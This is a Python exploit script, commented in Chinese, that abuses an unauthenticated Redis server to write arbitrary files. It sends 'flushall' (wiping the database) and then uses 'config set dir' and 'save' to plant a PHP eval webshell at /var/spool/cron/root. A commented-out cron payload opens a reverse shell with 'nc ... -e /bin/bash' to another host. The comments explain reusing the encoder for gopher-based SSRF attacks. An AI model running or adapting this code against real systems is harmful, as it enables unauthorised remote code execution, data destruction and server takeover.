import socket

# 默认的不允许值里面有空，如果需要有空的话。可以使用^进行代替。(ps.后面会被占位符进行占位)

# redis 写入webshell脚本。可以修改redis_format函数，来写gopher协议的redis攻击


CRLF = "\r\n"

def redis_format(command):
    cmd = []
    if isinstance(command,list):
        cmd = command
    else:
        cmd.append(command)

    result = []
    for x in range(len(cmd)):
        rn_list = cmd[x].split(' ')              # 进行空格切分
        rn_zong_len = len(rn_list)              # *? 表示总长度的获取
        for y in range(len(rn_list)):
            rn_list[y] = '$'+str(len(rn_list[y]))+CRLF+rn_list[y].replace("^",' ')
        

        result.append('*'+str(rn_zong_len)+CRLF+CRLF.join(rn_list)+CRLF)
    return ''.join(result).encode('utf-8')







if __name__ == "__main__":

    # 此工具使用socket进行的对redis写入文件的操作。本质上，如果需要使用gopher协议来进行操作的话。只需要修改此脚本即可
    # 要进行其他操作的话，只需要在cmd的list中，直接写入语句即可。
    # 需要注意的是，此脚本默认不能使用' '空格。如果要使用空格，例如：<?php @eval($_POST[a])?>这种的话。需要使用^来进行占位
                                                                    # 脚本会自动的替换掉空格

    # shell = '\n\n*/1^*^*^*^*^nc^192.168.2.18^2727^-e^/bin/bash^^\n\n\n'   # 计划任务弹shell
    # 目标文件路径为：/var/spool/cron/root


    shell = '<?php^show_source(__FILE__);@eval($_POST[name])?>'
    target_path = '/var/spool/cron'         
    target_name = 'root'
    cmd = [
        'flushall',
        'set 1 {shell}'.format(shell=shell),
        'config set dir {target_path}'.format(target_path=target_path),
        'config set dbfilename {target_name}'.format(target_name=target_name),
        'save'
    ]




    # 如果需要进行redis的其他协议的利用的话，可以直接将上面的redis_format函数进行重用。
    # 不过需要注意的是，还是不能滥用空格，需要使用^进行替换空格的操作
    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ss.connect(('192.168.2.138',6379))
    ss.send(redis_format(cmd))
    print(ss.recv(1024).decode('utf-8'))